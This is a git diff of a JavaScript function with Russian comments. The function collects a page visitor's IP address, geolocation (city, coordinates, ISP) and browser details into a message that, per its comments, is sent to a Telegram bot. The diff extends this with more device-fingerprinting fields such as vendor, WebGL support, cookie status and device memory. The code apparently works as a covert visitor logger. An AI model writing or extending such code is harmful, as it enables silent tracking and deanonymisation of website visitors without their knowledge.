@@ -35,11 +35,26 @@ function getClientInfo() {
       const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown Timezone'; // Часовой пояс
       const isTouchDevice = 'ontouchstart' in window ? 'Yes' : 'No'; // Есть ли сенсорный экран
 
+      // Дополнительные данные о браузере и устройстве
+      const vendor = navigator.vendor || 'Unknown Vendor';  // Поставщик браузера (например, Google, Apple)
+      const appVersion = navigator.appVersion || 'Unknown App Version';  // Версия браузера
+      const isWebGLSupported = typeof WebGLRenderingContext !== 'undefined' ? 'Yes' : 'No'; // Поддержка WebGL
+      const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No'; // Включены ли cookies
+      const deviceMemory = navigator.deviceMemory || 'Unknown Device Memory';  // Память устройства (в ГБ)
+
+      // Время с момента загрузки страницы
+      const loadTime = (performance.now() / 1000).toFixed(2) + ' seconds';
+
+      // Тип устройства (мобильное или десктопное)
+      const deviceType = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile/i.test(ua) ? 'Mobile' : 'Desktop';
+
       // Формируем сообщение, которое отправим в Telegram
       const message = encodeURIComponent(
         `IP: ${ip}\nCountry: ${country} ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\n\n` +
         `User-Agent: ${ua}\nLanguage: ${language}\nPlatform: ${platform}\nScreen: ${screenWidth}x${screenHeight}\n` +
-        `Color Depth: ${colorDepth}-bit\nTimezone: ${timezone}\nTouch Device: ${isTouchDevice}`
+        `Color Depth: ${colorDepth}-bit\nTimezone: ${timezone}\nTouch Device: ${isTouchDevice}\n` +
+        `Vendor: ${vendor}\nApp Version: ${appVersion}\nWebGL Support: ${isWebGLSupported}\nCookies Enabled: ${cookiesEnabled}\n` +
+        `Device Memory: ${deviceMemory} GB\nLoad Time: ${loadTime}\nDevice Type: ${deviceType}`
       );
 
       // Настроим Telegram Bot API URL для отправки сообщения
